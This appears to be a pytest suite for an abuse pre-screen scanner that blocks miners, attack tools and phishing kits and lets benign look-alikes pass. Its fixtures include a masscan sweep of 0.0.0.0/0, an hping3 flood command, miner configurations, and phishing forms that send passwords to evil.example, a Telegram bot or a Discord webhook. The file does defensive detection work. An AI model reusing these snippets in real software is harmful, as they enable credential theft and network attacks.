"""Abuse pre-screen: every rule fires on its marker, and ordinary apps that look a bit like
them (one email, a requests app, a crypto dashboard, a real login page) stay clean or only flagged."""

from pathlib import Path

import pytest

from shipcube_profiler import AbuseRefused, Verdict, prescreen
from shipcube_profiler import prescreen_patterns as P

SAMPLES = Path(__file__).resolve().parents[1] / "samples"
FLASK = "from flask import Flask, request\napp = Flask(__name__)\n"


def scan(tmp_path, files: dict[str, str | bytes]) -> Verdict:
    for rel, content in files.items():
        f = tmp_path / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_bytes(content if isinstance(content, bytes) else content.encode())
    return prescreen(tmp_path)


# --- high confidence: refuse --------------------------------------------------------------------

@pytest.mark.parametrize("files,code", [
    ({"bin/xmrig": b"\x7fELF..."}, P.CRYPTO_MINER),
    ({"tools/cpuminer": b"\x7fELF"}, P.CRYPTO_MINER),
    ({"main.py": "POOL = 'stratum+tcp://pool.example:3333'\n"}, P.CRYPTO_MINER),
    ({"start.sh": "./worker -o pool:443 -u WALLET --donate-level 1\n"}, P.CRYPTO_MINER),
    ({"config.json": '{"cpu": true, "algo": "rx/0"}'}, P.CRYPTO_MINER),
    ({"masscan": b"\x7fELF"}, P.ATTACK_TOOL),
    ({"scan.py": "import subprocess\nsubprocess.run(['masscan', '0.0.0.0/0', '-p80'])\n"}, P.ATTACK_TOOL),
    ({"flood.sh": "hping3 -S --flood -p 80 target\n"}, P.ATTACK_TOOL),
    ({"main.py": "import slowloris\n"}, P.ATTACK_TOOL),
    ({"requirements.txt": "flask\nMHDDoS==1.0\n"}, P.ATTACK_TOOL),
    ({"templates/login.html": "<title>Sign in to your Microsoft account</title><form action='https://evil.example/c'>"
                              "<input type=password name=p></form>"}, P.PHISHING_KIT),
    ({"index.html": "<form><input type='password' name='p'></form><script>"
                    "fetch('https://api.telegram.org/bot123/sendMessage')</script>"}, P.PHISHING_KIT),
    ({"app.py": FLASK + "import requests\n@app.post('/login')\ndef l():\n    p = request.form['password']\n"
                "    requests.post('https://discord.com/api/webhooks/1/x', json={'p': p})\n"}, P.PHISHING_KIT),
])
def test_high_confidence_markers_block(tmp_path, files, code):
    v = scan(tmp_path, files)
    assert v.blocked and code in v.reasons, v.to_dict()
    d = v.to_dict()
    assert d["verdict"] == "blocked"
    for content in files.values():   # hits name the rule and file, never the matched text
        text = content if isinstance(content, str) else ""
        assert not text or text not in str(d)


# --- low confidence: flag, don't block ----------------------------------------------------------

@pytest.mark.parametrize("files,signal", [
    ({"dash.py": "URL = 'https://api.nanopool.org/v1/xmr/balance/'\n"}, "prescreen_mining_pool_reference"),
    ({"net.py": "import nmap\nnm = nmap.PortScanner()\n"}, "prescreen_network_scanner"),
    ({"requirements.txt": "python-nmap==0.7.1\n"}, "prescreen_network_scanner"),
    ({"x.py": "def syn_flood(target):\n    pass\n"}, "prescreen_flood_script"),
    ({"mailer.py": "import smtplib, csv\ns = smtplib.SMTP('localhost')\n"
                   "for row in csv.reader(open('leads.csv')):\n    s.sendmail('a@b', row[0], 'hi')\n"},
     "prescreen_bulk_mail"),
    ({"login.html": "<h1>PayPal login</h1><form method=post action='/login'><input type=password></form>"},
     "prescreen_phishing_suspect"),
])
def test_low_confidence_markers_flag_without_blocking(tmp_path, files, signal):
    v = scan(tmp_path, files)
    assert not v.blocked and signal in v.signals and v.to_dict()["verdict"] == "flagged", v.to_dict()


# --- benign look-alikes: clean ------------------------------------------------------------------

@pytest.mark.parametrize("files", [
    # a normal Flask app that sends one email
    {"app.py": FLASK + "import smtplib\n@app.post('/contact')\ndef c():\n    s = smtplib.SMTP('smtp.corp')\n"
               "    s.sendmail('noreply@corp', 'team@corp', request.form['msg'])\n    return 'ok'\n"},
    # a notification to a fixed short list is not bulk mail
    {"notify.py": "import smtplib\ns = smtplib.SMTP('x')\nfor to in ['a@x', 'b@x']:\n    s.sendmail('n@x', to, 'm')\n"},
    # a legit requests app
    {"app.py": FLASK + "import requests\n@app.route('/')\ndef i():\n    return requests.get('https://api.github.com').text\n",
     "requirements.txt": "flask\nrequests==2.32.3\n"},
    # a real login page posting to its own backend
    {"templates/login.html": "<title>Sign in</title><form method=post action='/login'>"
                             "<input name=u><input type=password name=p></form>"},
    # SSO login to an external IdP, no brand impersonation, no exfil endpoint
    {"login.html": "<form action='https://acme.auth0.com/login'><input type=password></form>"},
    # a Slack alert that doesn't touch passwords
    {"alert.py": "import requests\nrequests.post('https://hooks.slack.com/services/T/B/X', json={'text': 'deploy done'})\n"},
    # docs mentioning words near the patterns
    {"README.md": "We protect against DDoS and mining abuse. Our scanner page lists ports.\n"},
])
def test_benign_look_alikes_are_clean(tmp_path, files):
    v = scan(tmp_path, files)
    assert v.to_dict()["verdict"] == "ok", v.to_dict()


@pytest.mark.parametrize("sample", ["dashboard", "nightly_batch"])
def test_samples_are_clean(sample):
    assert prescreen(SAMPLES / sample).to_dict()["verdict"] == "ok"


def test_symlinks_and_big_files_are_not_followed(tmp_path):
    (tmp_path / "big.txt").write_bytes(b"x" * (P.MAX_TEXT_BYTES + 10) + b"stratum+tcp://")
    (tmp_path / "link").symlink_to("/etc")
    assert prescreen(tmp_path).to_dict()["verdict"] == "ok"


def test_abuse_refused_carries_the_codes(tmp_path):
    v = scan(tmp_path, {"xmrig": b"x", "x.py": "import nmap\n"})
    e = AbuseRefused(v)
    assert e.codes == ["crypto_miner"] and "crypto_miner" in str(e)
    assert v.signals == ["prescreen_network_scanner"]
